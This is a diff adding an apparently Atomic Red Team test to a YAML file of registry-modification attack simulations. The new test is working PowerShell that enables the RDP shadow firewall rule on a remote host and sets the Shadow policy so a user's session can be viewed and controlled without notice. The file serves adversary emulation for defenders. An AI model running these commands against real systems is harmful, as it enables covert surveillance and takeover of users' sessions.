@@ -1100,3 +1100,25 @@ atomic_tests:
        reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d 3 /f
     name: command_prompt
     elevation_required: true
+- name: Setting Shadow key in Registry for RDP Shadowing
+  description: |-
+    Microsoft Remote Desktop Protocol (RDP) supports a “shadowing” feature and RDP is available in all Windows Server Operating Systems and the business editions of end-user Windows versions.
+    In order to use the RDP shadowing feature, the Remote Desktop Services (TermService) service needs to be running (which it does by default), a rule needs to be enabled in the Windows Firewall and in case of stealth reasons, a setting needs to be configured to not prompt the user for permission when they are being shadowed.
+    In order to configure RDP shadowing session in a quiet mode.  The registry of a remote system can be updated using several protocols, depending on the accessible ports and configuration of the services listening on those ports. Our aim is to set the Shadow value in HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services on the remote machine to 2, which allows us to both view and control the session without the user being informed.
+    [Reference](https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing)
+  supported_platforms:
+  - windows
+  input_arguments:
+    server_name:
+      description: The remote server that we need to shadow and have to do the registry modification.
+      type: string
+      default: localhost
+  executor:
+    command: |-
+       $s= New-CimSession -Computername #{server_name} -SessionOption (New-CimSessionOption -Protocol Dcom)
+       Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName="Remote Desktop - Shadow (TCP-In)"' -CimSession $s | Invoke-CimMethod -MethodName Enable
+       Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName="Software\Policies\Microsoft\Windows NT\Terminal Services"; sValueName="shadow"; uValue=[uint32]2} -CimSession $s
+    cleanup_command: |
+       Invoke-CimMethod -ClassName StdRegProv -MethodName DeleteValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName="Software\Policies\Microsoft\Windows NT\Terminal Services"; sValueName="Shadow"} -CimSession $s
+    name: powershell
+    elevation_required: true
